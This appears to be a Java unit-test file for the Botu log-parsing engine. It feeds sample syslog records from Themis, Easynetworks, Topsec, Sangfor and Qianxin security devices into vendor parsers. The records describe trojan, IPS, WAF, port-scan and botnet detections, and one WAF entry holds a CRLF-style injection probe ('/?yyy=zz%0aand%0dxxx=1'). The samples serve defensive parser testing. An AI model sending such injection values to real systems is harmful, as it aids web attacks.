      data = "Feb 20 10:01:58 Themis auth_server: devid=0 date=\"2012/02/20 10:01:58\" dname=Themis logtype=5 pri=6 ver=0.3.0 mod=uma username=\"user2\"  ip=\"192.168.1.23\"  act=\"登录\"  result=\"成功\"  msg=\"无\"  dsp_msg=\"用户认证 日志\"  fwlog=0";
      parse(botuEngine, data);
      data = "devid=0 date=\"2012/07/19 00:14:09\" dname=Themis logtype=7 pri=4 ver=0.3.0 user=\"\" mod=av eventtype=AV eventname=\"Trojan PSW.Jianghu.ei\" severity=高 dsp_msg=\"发现病毒: PSW.Jianghu.ei; 类型: Trojan\" protocol=TCP srcaddr=2.2.2.200 srcport=80 destaddr=10.1.5.200 destport=61795 srcregion=\"美国\" destregion=\"英国\" app=HTTP  repeated=1 eventdetails=\"病毒库/病毒/avExample5.exe.a\" action=\"drop\" if=\"\" fwlog=0";
      parse(botuEngine, data);
      data = "May 28 10:25:56 themis asdeamon: devid=0 date=\"2013/05/28 10:25:56\" dname=themis logtype=12 pri=4 ver=0.3.0 eventtype=ANTI_SPAM mod=antispam dsp_msg=\"反垃圾邮件 oyangyufu@163.com 在垃圾邮件地址列表中\"  severity=1 protocol=SMTP srcip=10.1.5.10 srcport=50533 dstip=220.181.12.13 dstport=25 repeated=1 fwlog=0";
      parse(botuEngine, data);
      data = "Feb 26 03:23:19 Themis asdeamon: devid=0 date=\"2012/02/26 03:23:19\" dname=Themis logtype=14 pri=4 ver=0.3.0 eventtype=病毒隔离 eventname=\"隔离文件 : email_2012_2_26_3_23_14_483926.eml\" mod=vq protocol=SMTP srcaddr=172.16.189.128 srcport=4026 destaddr=172.168.1.102 destport=25  fwlog=0";
      parse(botuEngine, data);
      data = "devid=0 date=\"2012/07/19 00:14:09\" dname=Themis logtype=16 pri=4 ver=0.3.0 user=\"\" mod=ips eventtype=IPS eventname=\"UserDefine sina_alert\" severity=1 dsp_msg=\"检测到攻击: sina_alert; 类型: UserDefine \" protocol=TCP srcaddr=10.1.5.200 srcport=56085 destaddr=119.84.71.211 destport=80 srcregion=\"HOST\" destregion=\"CN-中国\" app=HTTP repeated=1 eventdetails=\"/1245758104/50/1300244013/0\" action=\"drop\" if=\"市场部\" fwlog=0";
      parse(botuEngine, data);
      data = "devid=0 date=\"2012/07/19 00:14:09\" dname=Themis logtype=18 pri=4 ver=0.3.0 user=\"\" mod=pc eventtype=PC eventname=\"协议控制 HTTP域名\" severity=低 dsp_msg=\"检测到事件:HTTP域名 www.sohu.com 被拒绝\" protocol=TCP srcaddr=10.1.5.200 srcport=61329 destaddr=123.58.182.252 destport=80 srcregion=\"HOST\" destregion=\"CN-中国\" app=HTTP repeated=1 eventdetails=\"www,sohu.com:/\" action=\"drop\" if=\"\" fwlog=0";
      parse(botuEngine, data);
      data = "devid=0 date=\"2012/08/09 17:34:40\" dname=themis logtype=20 pri=4 ver=0.3.0 user=\"\" mod=antiscan eventtype=ANTISCAN eventname=\"antiscan portscan\" severity=低 dsp_msg=\"检测到事件:portscan;type:antiscan\" protocol=UDP srcaddr=192.168.101.19 srcport=0 destaddr=255.255.255.255 destport=0 srcregion=\"美国\" destregion=\"英国\" app=HTTP repeated=1 eventdetails=\"portscan\" action=\"通过\" if=\"\"  fwlog=0";
      parse(botuEngine, data);
      data = "devid=0 date=\"2009/04/02 14:20:56\" dname=themis logtype=22 pri=6 ver=0.3.0 mod=scan taskname=111 hostip=219.133.49.206 level=漏洞 pluginid=3240 port=general/SMBClient risk=高 family=后门 summary=这是一个后门 user=\"\" dsp_msg=\"发现漏洞漏洞扫描任务111发现主机219.133.49.206存在编号为3240的漏洞\" fwlog=0";
      parse(botuEngine, data);
      data = "devid=0 date=\"2012/07/19 00:14:09\" dname=Themis logtype=23 pri=4 ver=0.3.0 user=\"\" mod=uids eventtype=UIDS_AV eventname=\"Trojan PSW.Jianghu.ei\"severity=高 dsp_msg=\"发现病毒:PSW.Jianghu.ei; 类型: Trojan\" protocol=TCP srcaddr=2.2.2.200 srcport=80 destaddr=2.2.2.199 destport=50178 srcregion=\"美国\" destregion=\"英国\" app=HTTP repeated=1 eventdetails=\"病毒库/病毒/avExample5.exe.a\" action=\"accept\" if=\"\" fwlog=0";
      parse(botuEngine, data);
      data = "devid=0 date=\"2012/07/19 00:14:09\" dname=Themis logtype=24 pri=4 ver=0.3.0 user=\"\" mod=uids eventtype=UIDS_IDS eventname=\"UserDefine sina_alert\" severity=1 dsp_msg=\"检测到攻击: sina_alert; 类型: UserDefine \" protocol=TCP srcaddr=10.1.5.200 srcport=56085 destaddr=119.84.71.211 destport=80 srcregion=\"HOST\" destregion=\"CN-中国\" app=HTTP repeated=1 eventdetails=\"/1245758104/50/1300244013/0\" action=\"drop\" if=\"\" fwlog=0";
      parse(botuEngine, data);
      data = "Mar 26 17:59:58 themis event: devid=0 date=\"2014/03/26 17:59:58\" dname=themis logtype=29 pri=4 ver=0.3.0 user=\"\" mod=\"Web应用防护\" eventtype=WAF eventname=\"跨站脚本攻击\" severity=中 dsp_msg=\"检测到攻击:跨站脚本攻击\" protocol=TCP srcaddr=10.1.5.200 srcport=3746 destaddr=211.152.122.22 destport=80 srcregion=\"HOST\" destregion=\"CN-中国\" app=HTTP repeated=1 eventdetails=\"/?yyy=zz%0aand%0dxxx=1\" action=\"丢弃\" if=\"\" fwlog=0";
      parse(botuEngine, data);
      data = "devid=0 date=\"2012/07/19 00:14:09\" dname=Themis logtype=32 pri=4 ver=0.3.0 user=\"\" mod=pcp eventtype=PCP eventname=\"Trojan PSW.Jianghu.ei\"severity=高 dsp_msg=\"发现病毒: PSW.Jianghu.ei; 类型: Trojan\" protocol=TCP srcaddr=2.2.2.200 srcport=80 destaddr=10.1.5.200 destport=61795 srcregion=\"美国\" destregion=\"英国\" app=HTTP repeated=1 eventdetails=\"病毒库/病毒/avExample5.exe.a\" action=\"drop\" if=\"\" fwlog=1";
      parse(botuEngine, data);
      data = "devid=0 date=\"2003/07/23 10:00:00\" dname=themis logtype=9 pri=5 ver=0.3.0 from=1.1.1.1 mod=av act=add name=test result=0 dsp_msg=\"add av policy\" user=administrator fwlog=0";
      parse(botuEngine, data);*/
      data = "devid=0 date=\"2023/08/02 08:00:00\" dname=Themis logtype=7 pri=4 ver=0.3.0 user=\"\" mod=av eventtype=AV eventname=\"Trojan PSW.Jianghu.ei\" severity=高 dsp_msg=\"发现病毒: PSW.Jianghu.ei; 类型: Trojan\" protocol=TCP srcaddr=2.2.2.200 srcport =80 destaddr=10.1.5.200 destport=61795 srcregion=\"美国\" destregion=\"英国\" app=HTTP  repeated=1 eventdetails=\"病毒库/病毒/avExample5.exe.a\" action=\"drop\" if=\"\" fwlog=0";
      parse(botuEngine, data);
    } catch (Exception e) {
      e.printStackTrace();
    }
  }

  public void testIdsEasynetworks() {
    String parserFile = "./resources/parsers/ids_easynetworks_ids_syslog.bo";
    Properties properties = buildProperties();
    try {
      BotuEngineFactory engineFactory = new BotuEngineFactory(properties);
      BotuEngine botuEngine = engineFactory.createBotuEngine(parserFile);
      EventPrintListener listener = new EventPrintListener();
      botuEngine.addBotuListener(listener);
      String data = "<189>date=2023-04-23 time=11:31:22 devname=APW1KAIRFM000525 device_id=APW1KAIRFM000525 log_id=2 type=traffic subtype=allowed pri=notice status=accept vd=\"root\" dir_disp=org tran_disp=noop src=10.11.0.22 srcname=10.11.0.22 src_port=42042 dst=10.0.13.2 dstname=10.0.13.2 dst_port=10050 tran_ip=N/A tran_port=0 service=10050/tcp proto=6 app_type=N/A duration=0 rule=1 policyid=1 identidx=0 sent=82 rcvd=81 shaper_drop_sent=0 shaper_drop_rcvd=0 perip_drop=0 shaper_sent_name=\"N/A\" shaper_rcvd_name=\"N/A\" perip_name=\"N/A\" sent_pkt=4 rcvd_pkt=4 vpn=\"N/A\" src_int=\"N/A\" dst_int=\"N/A\" SN=0 app=\"N/A\" app_cat=\"N/A\" user=\"N/A\" group=\"N/A\" carrier_ep=\"N/A\" result=\"success\" src_mac=\"00:00:5e:00:04:71\" dst_mac=\"ac:74:09:7b:04:3c\"";
      parse(botuEngine, data);
      data = "<185>date=2019-11-08 time=16:11:39 devname=QDLH-ZGW-A device_id=APW1KMB001001216 log_id=18433 type=ips subtype=anomaly pri=alert severity=critical carrier_ep=\"N/A\" vd=\"N/A\" vd=\"N/A\" profile=\"N/A\" src=10.72.133.30 dst=10.12.171.90 src_int=\"port2\" dst_int=\"N/A\" policyid=N/A identidx=N/A serial=0 status=detected proto=1 service=icmp vd=\"root\" count=17 icmp_id=0x00a3 icmp_type=0x08 icmp_code=0x00 attack_id=16777320 sensor=\"all_default\" ref=\"http://www.easynetworks.com.cn/ids/VID16777320\" user=\"N/A\" group=\"N/A\" msg=\"anomaly: icmp_sweep, 101 > threshold 100, repeats 17 times\"";
      parse(botuEngine, data);
      data = "2019-08-01 16:17:39 log_id=16384 type=ips subtype=signature pri=alert vd=root severity=\"low\" src=\"192.168.1.244\" dst=\"42.236.22.238\" src_int=\"internal\" dst_int=\"port6\" policyid=1 identidx=0 serial=47901748 status=\"detected\" proto=6 service=\"http\" count=1 src_port=45670 dst_port=80 attack_id=29511 sensor=\"all_default\" ref=\"http://www.easynetworks.com.cn/ids/VID29511\" incident_serialno=739863772 msg=\"a-ipdf: TCP.Overlapping.Fragments, seq 1802525757, ack 1127836999, flags A\"";
      parse(botuEngine, data);
      data = "2021-04-13 10:50:25 log_id=53251 type=icproto subtype=icproto-log pri=notice vd=root vd=\"root\" icp_eventname=\"Invalid Device Num\" proto=\"modbus\" icp_servip=\"192.168.1.187\" icp_visip=\"192.168.1.38\" icp_devid=1 icp_funcid=3 action=\"pass\" icp_servport=502 icp_viport=52124 msg=\"Modbus:Invalid dev:: IP:c0a801bb,dev:1,func:3(ACT:0-5)\" icp_name=\"mmm\" icp_severity=4";
      parse(botuEngine, data);
    } catch (Exception e) {
      e.printStackTrace();
    }
  }

  public void testAuditTopsecTA_NET() {
    String parserFile = "./resources/parsers/audit_topsec_ta-net[3.2294.3419.1_net_upt-3524.1_net]_syslog.bo";
    Properties properties = buildProperties();
    try {
      BotuEngineFactory engineFactory = new BotuEngineFactory(properties);
      BotuEngine botuEngine = engineFactory.createBotuEngine(parserFile);
      EventPrintListener listener = new EventPrintListener();
      botuEngine.addBotuListener(listener);
      String data = "vendor=\"Topsec\" dev_type=\"6\" dev_name=\"Q37961408399\" dev_ip=\"10.254.11.102\" time=\"2023-04-23 10:46:09\" index=\"502\" recorder=\"TAW\" version=\"V3.2294.4998.1_net\" i_srcip=\"10.11.0.8\" i_dstip=\"210.52.217.23\" i_srcport=\"60532\" i_dstport=\"80\" s_protocol=\"HTTP上传\" s_eid=\"23042310460901050869\" s_devid=\"c9c2da94-f768-11c0-bbd8-6457e58f27e\" s_srcmac=\"ac:74:09:7b:04:3c\" s_dstmac=\"00:00:5e:00:04:71\" s_protocolgroup=\"HTTP应用\" i_ipproto=\"6\" i_warninglevel=\"6\" i_sip_city_id=\"0\" i_dip_city_id=\"168951809\" i_logtime=\"1682217969\" i_sip_score=\"0\" i_dip_score=\"0\" s_hostinfo_user=\"\" s_hostinfo_other=\"\" i_ruleset_id=\"900001\" s_ruleset_name=\"应用审计默认策略\" i_rule_id=\"0\" s_rule_name=\"\" s_remark=\"\" i_alarm_times=\"\" i_sound_light_alarm=\"\" i_vlanid=\"\" s_srcuser=\"\" s_dstuser=\"\" s_flid=\"\" s_http_host=\"qup.f.360.cn\" s_http_refer=\"\" s_http_url=\"http://qup.f.360.cn/cloudquery.php\" s_http_response_ct=\"application/octet-stream\" s_http_request_ct=\"multipart/form-data\" s_http_reqfile=\"/cloudquery.php\" s_http_request_param=\"\" s_http_server=\"nginx\" s_http_cookie=\"\" s_http_user_agent=\"Post_Multipart\" s_http_method=\"POST\" s_http_filename=\"\" i_http_retcode=\"200\" s_http_xforwardedfor=\"\" s_http_post_data=\"\" s_http_eventid=\"23042310460902009780\" i_domain_category=\"7\" i_domain_threattype=\"0\" i_http_proxy_connection=\"0\" i_http_return_len=\"654\" i_http_resp_time=\"48.920000\" s_http_account=\"\" s_http_bsname=\"\" s_http_authorization=\"\"";
      parse(botuEngine, data);
      data = "vendor=\"Topsec\" dev_type=\"6\" dev_name=\"Q37961408399\" dev_ip=\"10.254.11.102\" time=\"2023-04-20 16:21:13\" index=\"502\" recorder=\"TAW\" version=\"V3.2294.4998.1_net\" i_srcip=\"10.2.0.5\" i_dstip=\"153.0.235.100\" i_srcport=\"51917\" i_dstport=\"80\" s_protocol=\"HTTP下载\" s_eid=\"23042016211301061323\" s_devid=\"c9c2da94-f768-11c0-bbd8-6457e58f27e\" s_srcmac=\"ac:74:09:7b:04:3c\" s_dstmac=\"00:00:5e:00:04:71\" s_protocolgroup=\"HTTP应用\" i_ipproto=\"6\" i_warninglevel=\"6\" i_sip_city_id=\"0\" i_dip_city_id=\"169410577\" i_logtime=\"1681978873\" i_sip_score=\"0\" i_dip_score=\"0\" s_hostinfo_user=\"\" s_hostinfo_other=\"\" i_ruleset_id=\"900001\" s_ruleset_name=\"应用审计默认策略\" i_rule_id=\"0\" s_rule_name=\"\" s_remark=\"\" i_alarm_times=\"\" i_sound_light_alarm=\"\" i_vlanid=\"\" s_srcuser=\"\" s_dstuser=\"\" s_flid=\"\" s_http_host=\"s.safe.360.cn\" s_http_refer=\"\" s_http_url=\"http://s.safe.360.cn/popwnd/pack_212009.zip\" s_http_response_ct=\"application/zip\" s_http_request_ct=\"\" s_http_reqfile=\"/popwnd/pack_212009.zip\" s_http_request_param=\"\" s_http_server=\"Byte-nginx\" s_http_cookie=\"\" s_http_user_agent=\"\" s_http_method=\"GET\" s_http_filename=\"\" i_http_retcode=\"200\" s_http_xforwardedfor=\"\" s_http_post_data=\"\" s_http_eventid=\"23042016211302000269\" i_domain_category=\"7\" i_domain_threattype=\"0\" i_http_proxy_connection=\"0\" i_http_return_len=\"1386\" i_http_resp_time=\"1.307000\" s_http_account=\"\" s_http_bsname=\"\" s_http_authorization=\"\"";
      parse(botuEngine, data);
      data = "vendor=\"Topsec\" dev_type=\"6\" dev_name=\"Q37961408399\" dev_ip=\"10.254.11.102\" time=\"2023-04-20 17:14:01\" index=\"502\" recorder=\"TAW\" version=\"V3.2294.4998.1_net\" i_srcip=\"10.11.0.41\" i_dstip=\"121.52.223.187\" i_srcport=\"52786\" i_dstport=\"2443\" s_protocol=\"SSL\" s_eid=\"23042017140101066807\" s_devid=\"c9c2da94-f768-11c0-bbd8-6457e58f27e\" s_srcmac=\"ac:74:09:7b:04:3c\" s_dstmac=\"00:00:5e:00:04:71\" s_protocolgroup=\"标准协议\" i_ipproto=\"6\" i_warninglevel=\"6\" i_sip_city_id=\"0\" i_dip_city_id=\"167837697\" i_logtime=\"1681982041\" i_sip_score=\"0\" i_dip_score=\"0\" s_hostinfo_user=\"\" s_hostinfo_other=\"\" i_ruleset_id=\"900001\" s_ruleset_name=\"应用审计默认策略\" i_rule_id=\"0\" s_rule_name=\"\" s_remark=\"\" i_alarm_times=\"\" i_sound_light_alarm=\"\" i_vlanid=\"\" s_srcuser=\"\" s_dstuser=\"\" s_ssl_finger=\"0x0c8028d57bc103cc7c789aee24ce6d77828eb08946e16681318b908b6e955f35ad3d8d2cb31a0cfa4ccf550be666fece0144784a7044ddb5848bc1fe49a56a8aaeff5bcb798ee1af75728ceae67df4e5a22980535e0b3438ebac4c1368068a98d6be226dd5a98f30097ff59938a3f99dd29debe39226d80a3da87b2a8c3021769a615d45c48a7b8108a42f5154dcb6abf1441bf1e2194f6f9d080fd17890747a09059f3dcd2c2132d4f01fba4a451fa81bb279ecdb15966c9c938f99ac6ea8d00d83eb281995f2525be4bd2d434ac25887cddfd07a8aa2c40c699e7936bf90ef94a19cc0369b004009f15c1cbe98e34b55eeb03fc4efa7896a59c4868bb49f84\" s_ssl_country=\"CN\" s_ssl_organize=\"Uniseas\" s_ssl_uorganize=\"Uniseas\" s_ssl_cname=\"SSLVPN\" s_ssl_ucname=\"v-cn.uniseas.com.cn\" s_ssl_sni=\"v-cn.uniseas.com.cn\" s_server_version=\"TLS 1.2\" s_cipher_suite=\"TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384\" s_skey_algorithm_type=\"EC diffie_hellman\" s_skey_signature_algorithm=\"\" s_skey_exchange_pubkey=\"04ea71157a040866b1e78e1bbcf6560a6cda6ad8544c4289b837fe4b8868ce2a63cf81b7861fb39fb86acd75c9cc1067f1a1c29138b6a548bafd92155a16684271\" s_ckey_algorithm_type=\"ECDHE\" s_ckey_exchange_pubkey=\"0443d267307a4552884902590e41d09d9ea32e3f08309bd0a8f2c00f52c6651e528b5737d8bef28acd5bc163b02ad83dc39f248bb99d9b0881c2ffbe7c9623ec34\"";
      parse(botuEngine, data);
      data = "vendor=\"Topsec\" dev_type=\"6\" dev_name=\"Q37961408399\" dev_ip=\"10.254.11.102\" time=\"2023-04-20 17:42:48\" index=\"502\" recorder=\"TAW\" version=\"V3.2294.4998.1_net\" i_srcip=\"10.11.0.41\" i_dstip=\"20.54.24.69\" i_srcport=\"52874\" i_dstport=\"443\" s_protocol=\"HTTPS\" s_eid=\"23042017424801068520\" s_devid=\"c9c2da94-f768-11c0-bbd8-6457e58f27e\" s_srcmac=\"ac:74:09:7b:04:3c\" s_dstmac=\"00:00:5e:00:04:71\" s_protocolgroup=\"标准协议\" i_ipproto=\"6\" i_warninglevel=\"6\" i_sip_city_id=\"0\" i_dip_city_id=\"402653184\" i_logtime=\"1681983768\" i_sip_score=\"0\" i_dip_score=\"0\" s_hostinfo_user=\"\" s_hostinfo_other=\"\" i_ruleset_id=\"900001\" s_ruleset_name=\"应用审计默认策略\" i_rule_id=\"0\" s_rule_name=\"\" s_remark=\"\" i_alarm_times=\"\" i_sound_light_alarm=\"\" i_vlanid=\"\" s_srcuser=\"\" s_dstuser=\"\" s_ssl_finger=\"0x306502305361b6cf6de511744690463cddf07c00aedb1f980769db456735ed56a7e467c5456141d2b221a7e22e1dd398136d5b97023100e91883c97165ba375e86b42a387d6916493fed3eb3b20e97ab8de110b04e2c0a86e1fe31bbd9532d5cf94859af7f4a7c\" s_ssl_country=\"US\" s_ssl_organize=\"Microsoft Corporation\" s_ssl_uorganize=\"Microsoft\" s_ssl_cname=\"Microsoft ECC Content Distribution Secure Server CA 2.1\" s_ssl_ucname=\"*.prod.do.dsp.mp.microsoft.com\" s_ssl_sni=\"array610.prod.do.dsp.mp.microsoft.com\" s_server_version=\"TLS 1.2\" s_cipher_suite=\"TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384\" s_skey_algorithm_type=\"EC diffie_hellman\" s_skey_signature_algorithm=\"\" s_skey_exchange_pubkey=\"04ba4ffd9d3cb415a65b4963b171990cd10254f187bbf63a05d5ef57638ed6b9afa0d1379716bc34845abd3e7efe067d6472c493b0c48c6feec1665c17fb8bd8b9565b1bc76813c43c65378364e6a07f9ad5c4291a4d2712a1ab76193f69d9073f\" s_ckey_algorithm_type=\"ECDHE\" s_ckey_exchange_pubkey=\"049bfc052ae3641273e428be9d7c56d61ca1280471ae38df6c4e35a9fb962ffacbe7f37fe411236d36a8f54904dd20d0c82d8d1b97b0360768c0d39c5291ba838c632984311ae47079ad8fd9079046c54e5ea6cfb8ce6f5f90a53fe1e1e7b6db6c\"";
      parse(botuEngine, data);
      data = "vendor=\"Topsec\" dev_type=\"6\" dev_name=\"Q37961408399\" dev_ip=\"10.254.11.102\" time=\"2023-04-20 15:43:29\" index=\"502\" recorder=\"TAW\" version=\"V3.2294.4998.1_net\" i_srcip=\"10.100.2.76\" i_dstip=\"10.11.0.111\" i_srcport=\"54854\" i_dstport=\"22\" s_protocol=\"SSH\" s_eid=\"23042015432900053938\" s_devid=\"c9c2da94-f768-11c0-bbd8-6457e58f27e\" s_srcmac=\"00:00:5e:00:04:71\" s_dstmac=\"ac:74:09:7b:04:3c\" s_protocolgroup=\"标准协议\" i_ipproto=\"6\" i_warninglevel=\"6\" i_sip_city_id=\"0\" i_dip_city_id=\"0\" i_logtime=\"1681976609\" i_sip_score=\"0\" i_dip_score=\"0\" s_hostinfo_user=\"\" s_hostinfo_other=\"\" i_ruleset_id=\"900001\" s_ruleset_name=\"应用审计默认策略\" i_rule_id=\"0\" s_rule_name=\"\" s_remark=\"\" i_alarm_times=\"\" i_sound_light_alarm=\"\" i_vlanid=\"\" s_srcuser=\"\" s_dstuser=\"\" s_ssh_username=\"\" s_ssh_command=\"\" s_ssh_return=\"\" s_ssh_client_version=\"SSH-2.0-OpenSSH_9.0\" s_ssh_client_info=\"\" s_ssh_server_version=\"SSH-2.0-OpenSSH_8.9p1\" s_ssh_server_info=\"Ubuntu-3\"";
      parse(botuEngine, data);
      data = "vendor=\"Topsec\" dev_type=\"6\" dev_name=\"Q37961408399\" dev_ip=\"10.254.11.102\" time=\"2023-04-20 15:57:16\" index=\"502\" recorder=\"TAW\" version=\"V3.2294.4998.1_net\" i_srcip=\"10.11.0.41\" i_dstip=\"172.22.24.22\" i_srcport=\"52543\" i_dstport=\"33888\" s_protocol=\"RDP\" s_eid=\"23042015571600056164\" s_devid=\"c9c2da94-f768-11c0-bbd8-6457e58f27e\" s_srcmac=\"ac:74:09:7b:04:3c\" s_dstmac=\"00:00:5e:00:04:71\" s_protocolgroup=\"标准协议\" i_ipproto=\"6\" i_warninglevel=\"6\" i_sip_city_id=\"0\" i_dip_city_id=\"0\" i_logtime=\"1681977436\" i_sip_score=\"0\" i_dip_score=\"0\" s_hostinfo_user=\"\" s_hostinfo_other=\"\" i_ruleset_id=\"900001\" s_ruleset_name=\"应用审计默认策略\" i_rule_id=\"0\" s_rule_name=\"\" s_remark=\"\" i_alarm_times=\"\" i_sound_light_alarm=\"\" i_vlanid=\"\" s_srcuser=\"\" s_dstuser=\"\" s_ssl_finger=\"0x3b8f5263dae1f2ea9e4d15dc14e8b7eb62066bdc0e97451965b83a638f9c1c032e47e41e7b428760a9bc28d44aa50bae6cb85bd68df39e7e1de6360870b8205cb946dde40c54d2466cca671805c3ace5a28ca7683bfa063fadcba8ab89843c7f24c5890d7d8e75a7279dff83991ad5141f93dd4eace91958503fa259ccfa95912442bcdac9da0c3478b1d1d2708e7b86381813636028ad8ebefb0b1b0463029ea81ee4322c1e8d9ed912b2ca08a94974f627c066f536f569b5284b9c14cab0c2e77f68fed86559863dca2112435bede7a9b3369da87abb40841e8f23cdbac805b0bca68bad3de4e7a171783a4f606d6f58d9c43448e2cdd336cfd903396d7a4e\" s_ssl_country=\"\" s_ssl_organize=\"\" s_ssl_uorganize=\"\" s_ssl_cname=\"S-RB-HY-TV-2\" s_ssl_ucname=\"S-RB-HY-TV-2\" s_ssl_sni=\"172.22.24.22\" s_server_version=\"TLS 1.2\" s_cipher_suite=\"TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA384\" s_skey_algorithm_type=\"EC diffie_hellman\" s_skey_signature_algorithm=\"rsa_pkcs1_sha256\" s_skey_exchange_pubkey=\"04e95ca7a96bbe58b364d04d8c02cf8f1bdcc74519c35d1b75d81ad5c8615611ec2d94f745b6d83510dc923bcc85aaa73979d42da51613e716abf7f72038e1a68a\" s_ckey_algorithm_type=\"ECDHE\" s_ckey_exchange_pubkey=\"04175bb2879ab716dd99e32923965a3be72073cb737c5948f233fcddcce12f56eac93d675bc61214861a29bac13b347ce8088b5609ed6c21b2e14e35bcf2feccfc\"";
      parse(botuEngine, data);
      data = "vendor=\"Topsec\" dev_type=\"6\" dev_name=\"Q37961408399\" dev_ip=\"10.254.11.102\" time=\"2023-04-23 01:58:32\" index=\"502\" recorder=\"TAW\" version=\"V3.2294.4998.1_net\" i_srcip=\"10.11.0.6\" i_dstip=\"10.0.12.4\" i_srcport=\"55734\" i_dstport=\"8000\" s_protocol=\"内网通\" s_eid=\"23042301583200024091\" s_devid=\"c9c2da94-f768-11c0-bbd8-6457e58f27e\" s_srcmac=\"ac:74:09:7b:04:3c\" s_dstmac=\"00:00:5e:00:04:71\" s_protocolgroup=\"即时通讯\" i_ipproto=\"6\" i_warninglevel=\"6\" i_sip_city_id=\"0\" i_dip_city_id=\"0\" i_logtime=\"1682186312\" i_sip_score=\"0\" i_dip_score=\"0\" s_hostinfo_user=\"\" s_hostinfo_other=\"\" i_ruleset_id=\"900001\" s_ruleset_name=\"应用审计默认策略\" i_rule_id=\"0\" s_rule_name=\"\" s_remark=\"\" i_alarm_times=\"\" i_sound_light_alarm=\"\" i_vlanid=\"\" s_srcuser=\"\" s_dstuser=\"\" s_flid=\"\" s_nwt_filename=\"331_13252519\"";
      parse(botuEngine, data);
    } catch (Exception e) {
      e.printStackTrace();
    }
  }

  public void testWafSangforWaf1000() {
    String parserFile = "./resources/parsers/waf_sangfor_waf1000_syslog.bo";
    Properties properties = buildProperties();
    try {
      BotuEngineFactory engineFactory = new BotuEngineFactory(properties);
      BotuEngine botuEngine = engineFactory.createBotuEngine(parserFile);
      EventPrintListener listener = new EventPrintListener();
      botuEngine.addBotuListener(listener);
      String data = "<134>Apr 17 11:27:02 localhost fwlog: 日志类型:WEB应用防护, 策略名称:保护服务器, 规则ID:0, 源IP:172.23.181.250, 源端口:57028, 目的IP:124.160.145.57, 目的端口:80, 攻击类型:方法过滤, 严重级别:中, 系统动作:拒绝, URL:wo-device.oss-cn-hangzhou.aliyuncs.com/release/linux/log/84E0F42D145A1607/2023-04-17/20230331-050021-AppLog.log.bz2";
      parse(botuEngine, data);
      data = "<134>Apr 17 11:24:49 localhost fwlog: 日志类型:服务控制或应用控制, 策略名称:联动WAF 保护服务器, 用户:(null), 源IP:172.18.211.3, 源端口:21665, 目的IP:116.95.27.41, 目的端口:80, 应用类型:(null), 应用名称:(null), 系统动作:联动拒绝";
      parse(botuEngine, data);
      data = "<134>May 25 11:31:48 localhost fwlog: 日志类型:IPS防护日志, 源IP:192.168.200.1, 源端口:1102, 目的IP:192.168.200.100, 目的端口:80, 协议:tcp, 攻击类型:web漏洞攻击, 漏洞名称:WebCalendar本地文件包含和PHP代码注入漏洞, 严重等级:高, 动作:拒绝";
      parse(botuEngine, data);
      data = "<134>May 25 11:16:42 localhost fwlog: 日志类型:病毒查杀, 用户:(null), 源IP:192.168.200.1, 源端口:49566, 目的IP:192.168.200.100, 目的端口:80, 病毒类型:2156133424, 病毒名:Heuristics.PDF.ObfuscatedNameObject, 应用名称:HTTP, 严重等级:高, 系统动作:被记录, URL:http://192.200.41.126/repro/adobe_pdf_embedded_exe_nojs.pdf";
      parse(botuEngine, data);
      data = "<134>May 25 11:05:16 localhost fwlog: 日志类型:DOS攻击日志, 源IP:192.168.200.53, 目的IP:192.168.200.152, 攻击方向:外网, 攻击类型:SYN和FIN标志位同时为1, 严重等级:中, 系统动作:拒绝";
      parse(botuEngine, data);
      data = "<134>Jan 14 14:53:39 localhost fwlog: 日志类型:系统操作, 用户:admin, IP地址:200.200.88.121, 操作对象:启用禁用, 操作类型:启用, 描述:OSPF 启用 成功";
      parse(botuEngine, data);
      data = "<134>Jan 14 14:51:25 localhost nat: 日志类型:NAT日志, NAT类型:snat, 源IP:192.15.168.120, 源端口:52977, 目的IP:113.108.80.138, 目的端口:53, 协议:17, 转换后的IP:192.168.155.246, 转换后的端口:52977";
      parse(botuEngine, data);
      data = "<134>May 25 12:45:59 localhost fwlog: 日志类型:SSL VPN用户行为日志, 用户:wjj, IP地址:100.100.88.121, 操作对象:SSL VPN, 操作:登录, 时间:2016-05-25 12:45:59, 描述:登录成功";
      parse(botuEngine, data);
      data = "<134>May 25 11:12:42 localhost fwlog: 日志类型:网站访问, 用户:(null), 源IP:192.168.200.1, 目的IP:192.168.200.100, 应用名称:IT相关, 系统动作:被记录, URL:http://www.shenxinfu.com/simple.php";
      parse(botuEngine, data);
      data = "<134>May 25 11:12:45 localhost fwlog: 日志类型:僵尸网络日志, 源IP:192.168.200.30, 源端口:1114, 目的IP:192.168.200.129, 目的端口:2000, 攻击类型:僵尸网络, 严重级别:低, 系统动作:被记录, URL:10.1.1.8:2000/DLLServer.dat";
      parse(botuEngine, data);
      data = "<134>May 25 11:22:03 localhost fwlog: 日志类型:用户认证, 用户:192.168.200.199, IP地址:192.168.200.199, 操作对象:注销, 登录时间:2016-05-25 10:55:54, 登录时长:1569, 注销时间:11:22:03";
      parse(botuEngine, data);
    } catch (Exception e) {
      e.printStackTrace();
    }
  }

  public void testVpnQianxinVpn() {
    String parserFile = "./resources/parsers/vpn_qianxin_sslvpn_syslog.bo";
    Properties properties = buildProperties();
    try {
      BotuEngineFactory engineFactory = new BotuEngineFactory(properties);
      BotuEngine botuEngine = engineFactory.createBotuEngine(parserFile);
      EventPrintListener listener = new EventPrintListener();
      botuEngine.addBotuListener(listener);
      String data = "20230517 17:12:56 Gateway |5|0x0200046d|User|Login|12201106|Success|用户[默认站点:12201106]登出系统 .";
      parse(botuEngine, data);
    } catch (Exception e) {
      e.printStackTrace();
    }
  }

  public void testUtmQianxinUtm() {
    String parserFile = "./resources/parsers/utm_qianxin_utm[v8.0.3]_syslog.bo";
    Properties properties = buildProperties();
    try {
      BotuEngineFactory engineFactory = new BotuEngineFactory(properties);
      BotuEngine botuEngine = engineFactory.createBotuEngine(parserFile);
      EventPrintListener listener = new EventPrintListener();
      botuEngine.addBotuListener(listener);
      String data = "<19>May 26 11:00:57 VmsecController CEF:0|Qianxin|奇安信网神统一服务器安全管理系统|8.0.3.1105|1002|登录失败|3|eventID=1002\tIP=10.135.12.81\tdescription=登录失败\toperator=\taddress=10.150.6.101\tobject=\ttenantid=\ttenantname=\tyear=2023\ttime=2023-05-26 11:00:57";
/*      parse(botuEngine, data);
